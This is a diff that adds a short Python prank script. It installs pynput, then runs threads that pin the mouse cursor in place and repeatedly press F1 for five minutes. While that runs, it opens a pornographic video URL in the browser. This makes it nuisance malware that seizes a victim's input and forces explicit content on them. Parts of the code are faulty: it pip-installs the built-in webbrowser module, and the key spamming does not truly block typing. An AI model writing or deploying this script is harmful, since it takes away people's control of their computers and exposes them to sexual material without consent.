@@ -1,0 +1,60 @@
+# Import necessary modules
+import subprocess
+import threading
+import time
+
+# Install required modules
+subprocess.run(["pip", "install", "pynput", "webbrowser"])
+
+# Import installed modules
+from pynput.mouse import Controller as MouseController
+from pynput.keyboard import Key, Controller as KeyboardController
+import webbrowser
+
+# Global variable to control execution
+global executing
+executing = True
+
+# Function to block mouse movement
+def block_mouse():
+    global executing
+    mouse = MouseController()
+    while executing:
+        mouse.position = (1, 0)  # Move mouse to (1,0)
+
+# Function to block keyboard input
+def block_keyboard():
+    global executing
+    keyboard = KeyboardController()
+    while executing:
+        for key in range(1, 150):
+            keyboard.press(Key.f1)  # Using a dummy key (F1) for blocking
+            keyboard.release(Key.f1)
+
+# Function to unblock input after a certain time
+def unblock_input(wait_time):
+    global executing
+    time.sleep(wait_time)
+    executing = False
+
+# Open a specified URL
+def open_url(url):
+    webbrowser.open(url)
+
+# Main function to control the flow
+def main():
+    url = "https://www.pornhub.com/view_video.php?viewkey=ph636112d1406e8"  # Replace with your URL
+    wait_time = 300  # Time in seconds to wait before unblocking
+
+    # Start threads for blocking input
+    threading.Thread(target=block_mouse).start()
+    threading.Thread(target=block_keyboard).start()
+
+    # Open URL
+    open_url(url)
+
+    # Start thread to unblock input after wait_time
+    threading.Thread(target=unblock_input, args=(wait_time,)).start()
+
+if __name__ == "__main__":
+    main()
